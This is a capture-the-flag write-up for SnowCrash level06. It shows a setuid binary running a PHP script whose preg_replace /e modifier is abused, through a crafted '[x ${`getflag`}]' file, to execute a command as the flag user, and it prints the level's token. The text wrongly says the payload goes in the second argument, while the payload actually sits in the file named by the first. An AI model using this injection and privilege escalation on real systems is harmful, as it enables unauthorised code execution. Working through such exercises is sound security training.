# Level 06

Level contains two files a setuid binary and a php script:

```bash
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
level06@SnowCrash:~$ file level06
level06: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaabebdcd979e47982e99fa318d1225e5249abea7, not stripped
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
level06@SnowCrash:~$
```

It seems like the suid binary runs the php script, let's see what the script does:

```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

The PHP script defines two functions, `y($m)` and `x($y, $z)`, which manipulate text. The x() function reads the content of a file specified by the first command-line argument, processes it using regular expressions, and then prints the result. The regular expressions replace dots with " x " and "@" with " y", while also converting "[" to "(" and "]" to ")" in the file's content. The final processed content is output to the console.
What caught my attention is the `preg_replace` function, it uses the modifier `e` which means that the replacement string is treated as PHP code and executed, this means that we can execute arbitrary PHP code by passing it as the second argument to the script, let's try it:

```bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/eee
level06@SnowCrash:~$ ./level06 /tmp/eee
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

level06@SnowCrash:~$
```

and we got the token !
